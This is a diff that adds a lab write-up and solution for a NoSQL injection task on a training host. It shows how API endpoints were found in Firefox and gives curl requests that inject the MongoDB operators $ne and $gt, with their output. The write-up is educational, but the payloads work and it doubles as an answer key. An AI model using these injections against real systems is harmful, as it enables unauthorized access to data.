@@ -639,3 +639,241 @@ git commit -m "4-flag.txt"
 git push
 ```
 
+## Task 5. NoSQLi - Discovering Injection Vulnerabilities
+
+Unlike SQL databases, NoSQL databases handle queries differently, often using JSON-like structures for queries.\
+Your mission is to detect an **endpoint** within the application that is susceptible to NoSQL injection but **`NOT Harmful`**.\
+For that you should:
+
+- Navigate to: `http://web0x01.hbtn/a3/nosql_injection`. (dont forget to edit your /etc/hosts)
+- Search for the vulnerable paramters.
+- $ echo "/api/some_endpoint/here" > 5-vuln.txt
+
+---
+
+\*
+
+Helpful Instructions:
+
+1. Understanding NoSQL Query Structure:
+- Familiarize yourself with how queries are constructed in NoSQL databases, such as MongoDB. Knowing the syntax for queries and operators is crucial.
+2. Manipulating Input Parameters:
+- Experiment with JSON-like syntax in input fields. For example, try injecting `{"$gt": ""}` to see if you can alter query logic.
+3. Observing Application Behavior:
+- Pay close attention to how the application responds to your injected payloads.  Any change in behavior, such as returning more results than expected or errors, could indicate a vulnerability.
+4. Error Messages:
+- Sometimes, the application might display error messages that can give you hints about the backend database or its structure.  Use this information wisely to craft more effective payloads.&#x20;
+
+\*
+
+
+## **Solution**:
+
+### Discover the API endpoints
+
+This task asks for a vulnerable endpoint, not a parameter name.
+
+For example, the expected output format is:
+
+```
+/api/a3/nosql_injection/some_endpoint
+```
+
+We must discover the real endpoint rather than guess.
+
+### What to do
+
+1. Open Firefox and navigate to:
+
+   `http://web0x01.hbtn/a3/nosql_injection`
+2. Press `Ctrl + Shift + E` to open Network Monitor.
+3. Select the Fetch/XHR filter.
+4. Refresh the page.
+5. Interact with the available forms, search fields, or filters.
+6. Look for requests to `/api/...` endpoints.
+
+For now, focus on identifying which endpoints retrieve or search data, rather than endpoints that modify or delete records.
+
+<img src="./HolbieCrypto.png" alt="Network Monitor showing Fetch/XHR requests" width="800"/>
+
+
+### Why?
+
+Unlike traditional SQL injection, MongoDB-style NoSQL injection often involves injecting query operators such as:
+
+```
+{"$gt": ""}
+```
+
+Here, `$gt` means greater than. If an application passes this object directly into a MongoDB query without validating its structure, the query may behave differently from an ordinary string comparison.
+
+But first we need to identify the actual API requests and their parameters.
+
+The screenshot reveals four API endpoints used by the Holbie Crypto application.
+
+| Endpoint                                 | Method | Purpose          |
+| ---------------------------------------- | ------ | ---------------- |
+| `/api/a3/nosql_injection/sign_in`        | POST   | Authentication   |
+| `/api/a3/nosql_injection/user_info`      | GET    | User information |
+| `/api/a3/nosql_injection/market_summary` | GET    | Market summary   |
+| `/api/a3/nosql_injection/market_values`  | POST   | Market data      |
+
+
+### Investigate `market_values`
+
+We're starting with `market_values` because it uses POST requests, returns database-related information, and appears to be a read-only operation.
+
+Before injecting anything, we need to understand its JSON request structure.
+
+### Do this in Firefox
+
+1. In the Network tab, click one of the `market_values` requests.
+2. Select the Request tab on the right.
+3. Expand the Request Body or JSON section.
+
+We're getting a JSON object with a single key-value pair:
+
+```json
+{
+	"coin": "HBTNc"
+}
+```
+
+The subsequent requests ask for different coins, such as `BTC`, `ETH`, and `SOL`.
+
+Once we know the real parameter names, we can test whether one accepts a MongoDB operator such as:
+
+```
+{"$ne": null}
+```
+
+`$ne` means not equal. If an application inserts this object directly into a MongoDB query, it can change an equality check into a broader condition.
+
+Let's test whether the backend interprets `coin` as a MongoDB query object rather than treating it as a simple string.
+
+### Test NoSQL injection using `$ne`
+
+Normally, the application sends:
+
+```
+{"coin": "BTC"}
+```
+
+We'll replace `"BTC"` with a MongoDB operator:
+
+```
+{"coin": {"$ne": null}}
+```
+
+The `$ne` operator means not equal. If passed directly into a MongoDB query, it can match documents where `coin` is not `null`, potentially returning multiple coins instead of one.
+
+### Executing this command
+
+```bash
+curl -sS -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/market_values' \
+  -H 'Content-Type: application/json' \
+  -d '{"coin":{"$ne":null}}' | jq .
+# {
+#   "coin": "HBTNc",
+#   "name": "Holbie Coin",
+#   "min": 105000,
+#   "id": "HBTNc",
+#   "price": "93927.15",
+#   "diff1d": 2.77768905639486,
+#   "trend1d": "down",
+#   "diff7d": 4.603575116846061,
+#   "marketCap": "$85.84B",
+#   "volume1d": "$381.51M",
+#   "summary": [
+#     "104592.96",
+#     "103217.82",
+#     "100667.49",
+#     "97654.28",
+#     "97728.13",
+#     "98857.78",
+#     "103221.28",
+#     "98988.63",
+#     "99409.95",
+#     "100910.93",
+#     "101268.65",
+#     "96720.14",
+#     "98857.74",
+#     "93687.85",
+#     "97832.87",
+#     "98843.83",
+#     "103345.19",
+#     "106643.25",
+#     "104155.92",
+#     "104284.14",
+#     "99213.66",
+#     "101462.72",
+#     "101520.72",
+#     "98251.48",
+#     "96536.58",
+#     "93927.15"
+#   ],
+#   "_id": "6adf7a01a45582ab6cd49232"
+# }
+```
+
+### Interpreting the response:
+
+- Multiple coins returned: Strong indication that the application is interpreting the injected operator.
+- **One coin returned**: Potentially interesting, but we need to compare it with a normal request.
+- Error or empty response: The input might be validated, or the endpoint might handle objects differently.
+
+
+The `$ne` injection returned a complete record for Holbie Coin (`HBTNc`), even though we didn't specify `HBTNc`.
+
+This is consistent with a NoSQL injection vulnerability, but we need one more test to distinguish it from a default fallback behavior.
+
+### What might be happening?
+
+The backend could be constructing a MongoDB query like:
+
+```
+db.coins.findOne({coin: req.body.coin})
+```
+
+the payload:
+
+```
+{"coin":{"$ne":null}}
+```
+
+would effectively produce:
+
+```
+db.coins.findOne({coin: {$ne: null}})
+```
+
+This matches a document whose `coin` field is not null. Since `findOne()` returns the first matching document, receiving just one coin doesn't rule out injection.
+
+### Test an invalid coin
+
+Let's see what happens when we request a coin that definitely shouldn't exist.
+
+Executing this single command:
+
+```bash
+curl -sS -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/market_values' \
+  -H 'Content-Type: application/json' \
+  -d '{"coin":"INVALID_COIN_92731"}' | jq .
+
+# null
+```
+
+Since the invalid coin returns no record, while `$ne` returns `HBTNc`, that's strong evidence that the backend is interpreting MongoDB query operators.
+
+
+Save the API endpoint and verify solution:
+
+```bash
+echo "/api/a3/nosql_injection/market_values" > 5-vuln.txt
+git add .
+git commit -m "5-vuln.txt"
+git push
+```
+
